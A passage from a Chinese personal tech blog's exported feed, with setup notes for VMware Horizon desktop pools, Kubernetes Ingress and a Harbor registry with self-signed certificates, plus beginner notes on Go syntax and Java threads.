安装VMware-Horizon-Agent并重启, </span></code></pre><h2 id="客户端-Agent"><a href="#客户端-Agent" class="headerlink" title="客户端: Agent"></a>客户端: Agent</h2><pre><code class="hljs bash"><span class="hljs-comment"># 开启USB重定向</span></code></pre><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><pre><code class="hljs bash"><span class="hljs-comment"># 登录svc web管理界面, 授权导入, 对接vCenter, 对接AD</span><span class="hljs-comment"># AD创建vm组: vm</span><span class="hljs-comment"># vCenter创建策略: 策略和配置文件&gt;虚拟机自定义规范&gt;新建虚拟机自定义规范(名称=ad,注册信息=domain,取消勾选许可信息,时区=北京, Windows服务器域=domain.cn)</span><span class="hljs-comment">## 创建池(清单&gt;桌面)</span><span class="hljs-comment"># 类型: 自动桌面</span><span class="hljs-comment"># vCenter Server: 完整虚拟机</span><span class="hljs-comment"># 用户分配: 专用</span><span class="hljs-comment"># 存储优化: 不适用VMware Virtual SAN</span><span class="hljs-comment"># 桌面池标识: ID=Test_Pool, 显示名称=Test_Pool</span><span class="hljs-comment"># 置备设置: 命名模式=TestPoolVM-&#123;n&#125;, 预先处理所有计算机, 2台</span><span class="hljs-comment"># vCenter设置: 模版=Win10, 存储=共享存储</span><span class="hljs-comment"># 桌面池设置: 远程计算机电源策略=始终打开电源,断开连接后注销=立即,</span><span class="hljs-comment"># 远程显示设置: 默认</span><span class="hljs-comment"># 高级存储选项: 默认</span><span class="hljs-comment"># 客户机自定义: 勾选从域账号中选择AD容器, 选择AD策略</span><span class="hljs-comment"># 即将完成: </span></code></pre><h3 id="导入许可-1"><a href="#导入许可-1" class="headerlink" title="导入许可"></a>导入许可</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233010814.png"></p><h3 id="对接vCenter"><a href="#对接vCenter" class="headerlink" title="对接vCenter"></a>对接vCenter</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007232912560.png"></p><h3 id="对接AD-1"><a href="#对接AD-1" class="headerlink" title="对接AD"></a>对接AD</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233046585.png"></p><h3 id="创建桌面池"><a href="#创建桌面池" class="headerlink" title="创建桌面池"></a>创建桌面池</h3><p>创建桌面</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251007233159412.png" alt="image-20251007233159412"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251007233305775.png" alt="image-20251007233305775"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233333007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233402103.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233428980.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233457273.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233547220.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233615447.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233710144.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233741180.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233927308.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233904397.png"></p><p>需要在vCenter创建”虚拟机自定义规范”</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20251007233952905.png"></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ingress</title>
      <link href="/2021/09/08/Ingress/"/>
      <url>/2021/09/08/Ingress/</url>
      
        <content type="html"><![CDATA[<h1 id="Ingress安装"><a href="#Ingress安装" class="headerlink" title="Ingress安装"></a>Ingress安装</h1><h3 id="1-环境说明"><a href="#1-环境说明" class="headerlink" title="1.环境说明"></a>1.环境说明</h3><ol><li>centos7.9最小安装</li><li>k8s二进制部署</li><li>harbor部署</li></ol><h3 id="2-安装步骤-链接-https-github-com-bogeit-LearnK8s-blob-main-第6关-k8s架构师课程之流量入口Ingress上部-md"><a href="#2-安装步骤-链接-https-github-com-bogeit-LearnK8s-blob-main-第6关-k8s架构师课程之流量入口Ingress上部-md" class="headerlink" title="2.安装步骤[链接](https://github.com/bogeit/LearnK8s/blob/main/第6关 k8s架构师课程之流量入口Ingress上部.md)"></a>2.安装步骤[链接](<a href="https://github.com/bogeit/LearnK8s/blob/main/%E7%AC%AC6%E5%85%B3">https://github.com/bogeit/LearnK8s/blob/main/第6关</a> k8s架构师课程之流量入口Ingress上部.md)</h3><ol><li>创建nginx-ingress.yaml</li><li>安装nginx-ingress</li></ol><p>&#96;&#96;<br>&#96;shell</p><h3 id="根据脚步创建pod"><a href="#根据脚步创建pod" class="headerlink" title="根据脚步创建pod"></a>根据脚步创建pod</h3><p>kubectl apply -f nginx-ingress.yaml</p><pre><code class="hljs">复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Harbor</title>
      <link href="/2021/09/08/Harbor/"/>
      <url>/2021/09/08/Harbor/</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>harbor 是一个可以部署在本地的Docker仓库</p><h1 id="2-部署步骤"><a href="#2-部署步骤" class="headerlink" title="2. 部署步骤"></a>2. 部署步骤</h1><ol><li>下载harbor的tar包<a href="https://github.com/goharbor/harbor/releases">github链接</a></li><li>上传到Linux系统</li><li>解压 <code>tar -zxvf harbor-xxx.tar</code></li><li>移动harbor <code>mv harbor /usr/local</code></li><li>生成openssl证书: <code>openssl genrsa -des3 -out server.key 2048</code>(密码123456)</li><li>创建证书请求：<code>openssl req -new -key server.key -out server.csr</code>(密码:123456, 国家：CN, 省会:GD, 市:ZJ, 机构:XJ, 单位：XJ，域名 hub.xj.com, 邮箱: <a href="mailto:&#104;&#x6a;&#x78;&#x73;&#116;&#97;&#x72;&#x74;&#x40;&#49;&#x32;&#54;&#46;&#x63;&#x6f;&#109;">hjxstart@126.com</a>, 密码：123456,公司名字:XJ).中途输入错误可以<code>Ctr+C</code>退出.</li><li>复制文件：cp server.key server.key.org</li><li>取消密码认证：<code>openssl rsa -in server.key.org -out server.key</code>(密码123456)</li><li>创建证书（类型:x509,有效期：365天）：<code>openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt</code></li><li>创建相应文件:<code>mkdir -p /data/cert</code></li><li>移动证书相关文件:<code>mv server.* /data/cert</code></li><li>修改<code>barbor配置文件</code>的<code>hostname(hub.xj.com) 和 https(certificate: server.crt; private_key: server.key)</code></li><li>运行prepare文件:<code>./prepare</code></li><li>安装harbor: <code>./install.sh</code></li><li>修改镜像仓库地址: <code>vi /etc/docker/daemon.json</code> <code>hub.xj.com</code></li><li>重启docker: <code>systemctl restart docker</code></li><li>harbor的使用</li></ol><pre><code class="hljs bash">docker tag nginx:latest hub.xj.com/harborProject/nginx:v1docker push </code></pre><h2 id="Harbor部署"><a href="#Harbor部署" class="headerlink" title="Harbor部署"></a>Harbor部署</h2><h3 id="1-环境说明"><a href="#1-环境说明" class="headerlink" title="1. 环境说明"></a>1. 环境说明</h3><ol><li>系统版本Centos7.9最小安装</li><li>使用二进制安装k8s<a href="https://www.toutiao.com/a6935437095985054219/?log_from=7099e5155a92b_1631092889404">链接</a></li></ol><h3 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2. 安装步骤"></a>2. 安装步骤</h3><ol><li>创建目录及下载harbor离线包</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 创建并进入相应目录</span><span class="hljs-built_in">mkdir</span> /data &amp;&amp; <span class="hljs-built_in">cd</span> /data<span class="hljs-comment"># 下载离线包，也可以直接通过连接下载</span>wget https://github.com/goharbor/harbor/releases/download/v2.2.0/harbor-offline-installer-v2.2.0.tgz<span class="hljs-comment"># 解压并删除离线包</span>tar xf harbor-offline-installer-v2.2.0.tgz &amp;&amp; <span class="hljs-built_in">rm</span> harbor-offline-installer-v2.2.0.tgz复制代码</code></pre><ol><li>修改harbro配置</li></ol><pre><code class="hljs nix"><span class="hljs-comment"># 进入harbor目录</span>cd harbor<span class="hljs-comment"># 负责harbor配置文件</span>cp harbor.yml.tmpl harbor.yml<span class="hljs-comment"># 修改harbor配置</span>vi harbor.yml    <span class="hljs-number">5</span> <span class="hljs-params">hostname:</span> harbor.xj.com    <span class="hljs-number">17</span>   <span class="hljs-params">certificate:</span> <span class="hljs-symbol">/data/harbor/ssl/tls.cert</span>    <span class="hljs-number">18</span>   <span class="hljs-params">private_key:</span> <span class="hljs-symbol">/data/harbor/ssl/tls.key</span>    <span class="hljs-number">34</span> <span class="hljs-params">harbor_admin_password:</span> boge666复制代码</code></pre><ol><li>创建harbor访问域名证书</li></ol><pre><code class="hljs sas">mkdir /data/harbor/ssl <span class="hljs-variable">&amp;&amp;</span> cd /data/harbor/sslopenssl genrsa -<span class="hljs-keyword">out</span> tls.<span class="hljs-keyword">key</span> 2048openssl req -new -x509 -<span class="hljs-keyword">key</span> tls.<span class="hljs-keyword">key</span> -<span class="hljs-keyword">out</span> tls.cert -days 360 -subj /CN=<span class="hljs-comment">*.xj.com</span><span class="hljs-comment">复制代码</span></code></pre><ol><li>准备好单机编排工具<code>docker-compose</code></li></ol><pre><code class="hljs ruby">&gt; 从二进制安装k8s项目的bin目录拷贝过来scp /etc/kubeasz/bin/docker-compose <span class="hljs-number">192.168</span>.<span class="hljs-number">18.200</span><span class="hljs-symbol">:/usr/bin/</span>&gt; 也可以在docker官方进行下载<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/docs.docker.com/compose</span><span class="hljs-regexp">/install/</span>复制代码</code></pre><ol><li>开始安装</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 回到harbor目录</span><span class="hljs-built_in">cd</span> /data/harbor<span class="hljs-comment"># 安装harbor</span>./install.sh<span class="hljs-comment"># 安装成功后可以配置hosts文件进行域名访问了</span>复制代码</code></pre><ol><li>推送镜像到harbor</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 添加hosts文件</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;192.168.18.200 harbor.xj.com&#x27;</span> &gt;&gt; /etc/hosts<span class="hljs-comment"># 登录</span>docker login harbor.xj.com<span class="hljs-comment"># 打标签</span>docker tag nginx:latest  harbor.xj.com/library/nginx:latest<span class="hljs-comment"># 推送镜像到harbor</span>docker push harbor.boge.com/library/nginx:1.18.0-alpine<span class="hljs-comment"># 登出</span>docker <span class="hljs-built_in">logout</span> harbor.xj.com<span class="hljs-comment"># 查看登录信息，不退出会存在隐患</span><span class="hljs-built_in">cat</span> ~/.docker/config.json复制代码</code></pre><ol><li>在其他节点上面拉取harbor镜像</li></ol><pre><code class="hljs elixir">&gt; 在集群每个 node 节点进行如下配置&gt; ssh to <span class="hljs-number">192.168</span>.<span class="hljs-number">18.199</span>(centos7)mkdir -p /etc/docker/certs.d/harbor.xj.comscp <span class="hljs-number">192.168</span>.<span class="hljs-number">18.200</span><span class="hljs-symbol">:/data/harbor/ssl/tls</span>.cert /etc/docker/certs.d/harbor.xj.com/ca.crt复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go</title>
      <link href="/2021/08/26/GO/"/>
      <url>/2021/08/26/GO/</url>
      
        <content type="html"><![CDATA[<h1 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h1><h2 id="GO语言环境配置"><a href="#GO语言环境配置" class="headerlink" title="GO语言环境配置"></a>GO语言环境配置</h2><pre><code class="hljs shell">go env -w GO111MODULE=ongo env -w GOPROXY=https://goproxy.cn,directgo get golang.org/x/tools/gopls@latestgo env -w GO111MODULE=autolanguage-shell复制代码</code></pre><hr><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="1-类型在变量名"><a href="#1-类型在变量名" class="headerlink" title="1. 类型在变量名"></a>1. 类型在变量名</h3><p>函数参数声明变量<code>x, y int</code><br>其他地方都是 var x, y int</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x <span class="hljs-type">int</span>, y <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<span class="hljs-keyword">return</span> x + y&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="2-多值返回"><a href="#2-多值返回" class="headerlink" title="2. 多值返回"></a>2. 多值返回</h3><p>可以在函数声明多个返回值</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x, y <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) &#123;<span class="hljs-keyword">return</span> y, x&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="3-命名返回值"><a href="#3-命名返回值" class="headerlink" title="3. 命名返回值"></a>3. 命名返回值</h3><p>命名返回值，相当于在函数顶部命名一个变量并赋值</p><pre><code class="hljs go"><span class="hljs-comment">// Go 的返回值可被命名，它们会被视作定义在函数顶部的变量。</span><span class="hljs-comment">// 没有参数的 `return` 语句返回已命名的返回值。</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">split</span><span class="hljs-params">(sum <span class="hljs-type">int</span>)</span></span> (x, y <span class="hljs-type">int</span>) &#123;x = sum * <span class="hljs-number">4</span> / <span class="hljs-number">9</span>y = sum - x<span class="hljs-keyword">return</span>&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="4-变量-var"><a href="#4-变量-var" class="headerlink" title="4.变量 var"></a>4.变量 var</h3><pre><code class="hljs go"><span class="hljs-comment">// `var` 语句用于声明一个变量列表，跟函数的参数列表一样，类型在最后。</span><span class="hljs-keyword">var</span> c, python, java <span class="hljs-type">bool</span>language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="5-变量的初始化"><a href="#5-变量的初始化" class="headerlink" title="5.变量的初始化"></a>5.变量的初始化</h3><pre><code class="hljs go"><span class="hljs-comment">// 变量声明可以包含初始值，每个变量对应一个。</span><span class="hljs-comment">// 如果初始化值已存在，则可以省略类型；变量会从初始值中获得类型。</span><span class="hljs-keyword">var</span> i, j <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> c, python, java = <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;no!&quot;</span>fmt.Println(i, j, c, python, java) <span class="hljs-comment">// 1 2 true false no!</span>&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="6-短变量声明"><a href="#6-短变量声明" class="headerlink" title="6.短变量声明"></a>6.短变量声明</h3><p>在函数中，简洁赋值语句 <code>:=</code> 可在类型明确的地方代替 <code>var</code> 声明。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> i, j <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>k := <span class="hljs-number">3</span>c, python, java := <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;no!&quot;</span>fmt.Println(i, j, k, c, python, java) <span class="hljs-comment">// 1 2 3 true false no!</span>&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="7-基本类型"><a href="#7-基本类型" class="headerlink" title="7.基本类型"></a>7.基本类型</h3><pre><code class="hljs go"><span class="hljs-type">bool</span><span class="hljs-type">string</span><span class="hljs-type">int</span>  <span class="hljs-type">int8</span>  <span class="hljs-type">int16</span>  <span class="hljs-type">int32</span>  <span class="hljs-type">int64</span><span class="hljs-type">uint</span> <span class="hljs-type">uint8</span> <span class="hljs-type">uint16</span> <span class="hljs-type">uint32</span> <span class="hljs-type">uint64</span> <span class="hljs-type">uintptr</span><span class="hljs-type">byte</span> <span class="hljs-comment">// uint8 的别名</span><span class="hljs-type">rune</span> <span class="hljs-comment">// int32 的别名</span>    <span class="hljs-comment">// 表示一个 Unicode 码点</span><span class="hljs-type">float32</span> <span class="hljs-type">float64</span><span class="hljs-type">complex64</span> <span class="hljs-type">complex128</span>复制代码<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-string">&quot;math/cmplx&quot;</span>)<span class="hljs-keyword">var</span> (ToBe   <span class="hljs-type">bool</span>       = <span class="hljs-literal">false</span>MaxInt <span class="hljs-type">uint64</span>     = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span> - <span class="hljs-number">1</span>z      <span class="hljs-type">complex128</span> = cmplx.Sqrt(<span class="hljs-number">-5</span> + <span class="hljs-number">12i</span>))<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;        <span class="hljs-comment">// Type: bool Value: false</span>fmt.Printf(<span class="hljs-string">&quot;Type: %T Value: %v\n&quot;</span>, ToBe, ToBe)        <span class="hljs-comment">// Type: uint64 Value: 18446744073709551615</span>fmt.Printf(<span class="hljs-string">&quot;Type: %T Value: %v\n&quot;</span>, MaxInt, MaxInt)        <span class="hljs-comment">// Type: complex128 Value: (2+3i)</span>fmt.Printf(<span class="hljs-string">&quot;Type: %T Value: %v\n&quot;</span>, z, z)&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="8-零值"><a href="#8-零值" class="headerlink" title="8.零值"></a>8.零值</h3><p>没有明确初始值的变量声明会被赋予它们的 <strong>零值</strong>。</p><p>零值是：</p><ul><li>数值类型为 <code>0</code>，</li><li>布尔类型为 <code>false</code>，</li><li>字符串为 <code>&quot;&quot;</code>（空字符串）。</li></ul><h3 id="9-类型转换"><a href="#9-类型转换" class="headerlink" title="9.类型转换"></a>9.类型转换</h3><p>Go 在不同类型的项之间赋值时需要显式转换。类型(值)</p><pre><code class="hljs stylus"><span class="hljs-comment">// 一些关于数值的转换：</span><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">i</span> int = <span class="hljs-number">42</span><span class="hljs-selector-tag">var</span> f float64 = <span class="hljs-built_in">float64</span>(i)<span class="hljs-selector-tag">var</span> u uint = <span class="hljs-built_in">uint</span>(f)<span class="hljs-comment">// 或者，更加简单的形式：</span><span class="hljs-selector-tag">i</span> := <span class="hljs-number">42</span>f := <span class="hljs-built_in">float64</span>(i)u := <span class="hljs-built_in">uint</span>(f)&lt;/pre&gt;复制代码</code></pre><h3 id="10-类型推导"><a href="#10-类型推导" class="headerlink" title="10.类型推导"></a>10.类型推导</h3><p>可以省略类型，自动推导出类型</p><pre><code class="hljs go">i := <span class="hljs-number">42</span>           <span class="hljs-comment">// int</span>f := <span class="hljs-number">3.142</span>        <span class="hljs-comment">// float64</span>g := <span class="hljs-number">0.867</span> + <span class="hljs-number">0.5i</span> <span class="hljs-comment">// complex128</span>复制代码</code></pre><h3 id="11-常量"><a href="#11-常量" class="headerlink" title="11.常量"></a>11.常量</h3><p>常量的声明与变量类似，只不过是使用 <code>const</code> 关键字。</p><p>常量可以是字符、字符串、布尔值或数值。</p><p>常量不能用 <code>:=</code> 语法声明。</p><h3 id="12-for"><a href="#12-for" class="headerlink" title="12.for"></a>12.for</h3><p>Go 只有一种循环结构：<code>for</code> 循环。</p><p>Go 的 for 语句后面的三个构成部分外没有小括号， 大括号 <code>{ }</code> 则是必须的。</p><p>for 是 Go 中的 “while”</p><p>无限循环</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;sum := <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;sum += i&#125;fmt.Println(sum)&#125;<span class="hljs-comment">// 初始化语句和后置语句是可选的。</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;sum := <span class="hljs-number">1</span><span class="hljs-keyword">for</span> ; sum &lt; <span class="hljs-number">1000</span>; &#123;sum += sum&#125;fmt.Println(sum)&#125;<span class="hljs-comment">// 此时你可以去掉分号，因为 C 的 `while` 在 Go 中叫做 `for`。</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;sum := <span class="hljs-number">1</span><span class="hljs-keyword">for</span> sum &lt; <span class="hljs-number">1000</span> &#123;sum += sum&#125;fmt.Println(sum)&#125;如果省略循环条件，该循环就不会结束，因此无限循环可以写得很紧凑。<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">for</span> &#123;&#125;&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre><h3 id="13-if"><a href="#13-if" class="headerlink" title="13.if"></a>13.if</h3><p>Go 的 <code>if</code> 语句与 <code>for</code> 循环类似，表达式外无需小括号 <code>( )</code> ，而大括号 <code>{ }</code> 则是必须的。</p><p>if 的简短语句</p><p>if 和 else</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sqrt</span><span class="hljs-params">(x <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">string</span> &#123;<span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> &#123;<span class="hljs-keyword">return</span> sqrt(-x) + <span class="hljs-string">&quot;i&quot;</span>&#125;<span class="hljs-keyword">return</span> fmt.Sprint(math.Sqrt(x))&#125;<span class="hljs-comment">// 同 `for` 一样， `if` 语句可以在条件表达式前执行一个简单的语句。</span><span class="hljs-comment">// 该语句声明的变量作用域仅在 `if` 之内。</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pow</span><span class="hljs-params">(x, n, lim <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<span class="hljs-keyword">if</span> v := math.Pow(x, n); v &lt; lim &#123;<span class="hljs-keyword">return</span> v&#125;<span class="hljs-keyword">return</span> lim&#125;<span class="hljs-comment">// 在 `if` 的简短语句中声明的变量同样可以在任何对应的 `else` 块中使用。</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pow</span><span class="hljs-params">(x, n, lim <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<span class="hljs-keyword">if</span> v := math.Pow(x, n); v &lt; lim &#123;<span class="hljs-keyword">return</span> v&#125; <span class="hljs-keyword">else</span> &#123;fmt.Printf(<span class="hljs-string">&quot;%g &gt;= %g\n&quot;</span>, v, lim)&#125;<span class="hljs-comment">// 这里开始就不能使用 v 了</span><span class="hljs-keyword">return</span> lim&#125;language-<span class="hljs-keyword">go</span>复制代码</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程</title>
      <link href="/2021/08/15/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2021/08/15/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="JAVA-HOME"><a href="#JAVA-HOME" class="headerlink" title="JAVA_HOME"></a>JAVA_HOME</h3><pre><code class="hljs java">JAVA_HOME=C:\Program Files\Java\jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0_131</span>Path=%JAVA_HOME%\binlanguage-java复制代码</code></pre><h1 id="第一章-线程简介"><a href="#第一章-线程简介" class="headerlink" title="第一章 线程简介"></a>第一章 线程简介</h1><h2 id="1-1-进程-Process"><a href="#1-1-进程-Process" class="headerlink" title="1.1 进程 Process"></a>1.1 进程 Process</h2><p>进程是执行程序的一次执行过程，它是一个动态的概念。是系统资源分配的单位。</p><h2 id="1-2-线程-Thread"><a href="#1-2-线程-Thread" class="headerlink" title="1.2 线程 Thread"></a>1.2 线程 Thread</h2><p>通过在一个进程中可以包含若干个线程，当然一个进程中至少有一个线程，不然没有存在的意义。线程是CPU调度和执行的单位。</p><h2 id="1-3-核心概念"><a href="#1-3-核心概念" class="headerlink" title="1.3 核心概念"></a>1.3 核心概念</h2><ol><li>线程就是独立的执行路径；</li><li>在程序运行时，即使没有自己创建线程，后台也会有多个线程，如主线程，gc线程；</li><li>main()称之为主线程，为系统的入口，用于执行整个程序；</li><li>在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度，调度器是与操作系统紧密相关的，先后顺序是不能人为的干预的；</li><li>对同一份资源操作时，会存在资源抢夺的问题，需要加入并发控制；</li><li>线程会带来额外的开销，如cpu调度时间，并发控制开销；</li><li>每个线程在自己的工作内存交互，内存控制不当会造成数据不一致。</li></ol><hr><h1 id="第二章-线程实现（重点）"><a href="#第二章-线程实现（重点）" class="headerlink" title="第二章 线程实现（重点）"></a>第二章 线程实现（重点）</h1><h2 id="2-1-继承Thread类（重点）"><a href="#2-1-继承Thread类（重点）" class="headerlink" title="2.1 继承Thread类（重点）"></a>2.1 继承Thread类（重点）</h2><ol><li>自定义线程类继承<strong>Thead类</strong>；</li><li>重写<strong>run()方法</strong>，编写线程执行体；</li><li>创建线程对象，调用start()方法启动线程，（调用run方法）。</li></ol><p>注意：线程开启不一定立即执行，有cpu调度执行。</p><h2 id="2-2-实现Runnable接口（重点）"><a href="#2-2-实现Runnable接口（重点）" class="headerlink" title="2.2 实现Runnable接口（重点）"></a>2.2 实现Runnable接口（重点）</h2><ol><li>自定义线程类实现<strong>Runnable</strong>接口；</li><li>重写runn方法；</li><li>执行线程需要丢入runnable接口实现类，调用start方法。</li></ol><h2 id="2-3-实现Callable接口（了解）"><a href="#2-3-实现Callable接口（了解）" class="headerlink" title="2.3 实现Callable接口（了解）"></a>2.3 实现Callable接口（了解）</h2><ol><li>实现Callable接口，需要返回值类型；</li><li>重写call方法，需要抛出异常；</li><li>创建目标对象；</li><li>创建执行服务：ExecutorService ser &#x3D; Executors.newFixedThreadPool(1);</li><li>提交执行：Future result1 &#x3D; se.submit(t1);</li><li>获取结果：boolean r1 &#x3D; result1.get();</li><li>关闭服务：ser.shutdownNow();</li></ol><hr><h1 id="第三章-线程状态"><a href="#第三章-线程状态" class="headerlink" title="第三章 线程状态"></a>第三章 线程状态</h1><h2 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h2><ol><li>线程状态图1<br>创建状态、就绪状态、阻塞状态、运行状态、死亡状态</li><li>线程状态图2<br>new、就绪状态、运行状态、阻塞状态、dead</li></ol><h2 id="3-2-线程方法"><a href="#3-2-线程方法" class="headerlink" title="3.2 线程方法"></a>3.2 线程方法</h2><h3 id="3-2-1-线程停止"><a href="#3-2-1-线程停止" class="headerlink" title="3.2.1 线程停止"></a>3.2.1 线程停止</h3><h3 id="3-2-2-线程休眠-sleep"><a href="#3-2-2-线程休眠-sleep" class="headerlink" title="3.2.2 线程休眠(sleep)"></a>3.2.2 线程休眠(sleep)</h3><ol><li>sleep(时间)指定当前线程阻塞的毫秒数;</li><li>sleep存在异常InterruptedException;</li><li>sleep时间达到后线程进入就绪状态;</li><li>sleep可以模拟网络延时，倒计时等;</li><li><strong>每一个对象都有一个锁, sleep不会释放锁;</strong></li></ol><h3 id="3-2-3-线程礼让-yield"><a href="#3-2-3-线程礼让-yield" class="headerlink" title="3.2.3 线程礼让(yield)"></a>3.2.3 线程礼让(yield)</h3><ol><li>礼让线程，让当前正在执行的线程暂停，但不阻塞；</li><li>将线程从过年运行状态转为就绪状态；</li><li><strong>让cpu重新调度，礼让不一定成功！看CPU心情</strong></li></ol><h3 id="3-2-4-Join"><a href="#3-2-4-Join" class="headerlink" title="3.2.4 Join"></a>3.2.4 Join</h3><ol><li>Joio合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞；</li><li>可以想象成插队</li></ol><h3 id="3-2-5-线程状态观测-Thread-State"><a href="#3-2-5-线程状态观测-Thread-State" class="headerlink" title="3.2.5 线程状态观测(Thread.State)"></a>3.2.5 线程状态观测(Thread.State)</h3><ol><li>NEW 尚位启动的线程处于此状态；</li><li>RUNNABLE 在Java虚拟机中执行的线程处于此状态；</li><li>BLOCKED 被阻塞等待监视器锁定的线程处于此状态；</li><li>WAITING 正在等待另一个线程执行待定动作的线程处于此状态；</li><li>TIMED_WAITING 正在等待另一个线程执行动作达到指定等待时间的线程处于此状态；</li><li>TERMINATED 已退出的线程处于此状态。</li><li>一个线程可以在给定时间点处于一个状态。这些状态是不反映任何操作系统线程状态的虚拟机状态。</li></ol><h3 id="3-2-6-线程优先级"><a href="#3-2-6-线程优先级" class="headerlink" title="3.2.6 线程优先级"></a>3.2.6 线程优先级</h3><ol><li>Java提供一个线程调度来监控程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行。</li><li>线程的优先级用数字表示，范围从1~10<ul><li>Thread.MIN_PRIORITY &#x3D; 1;</li><li>Thread.MAX_PRIORITY &#x3D; 10;</li><li>Thread.NORM_PRIORITY &#x3D; 5;</li></ul></li><li>使用以下方式改变或获取优先级<ul><li>getPriority() setPriority(int 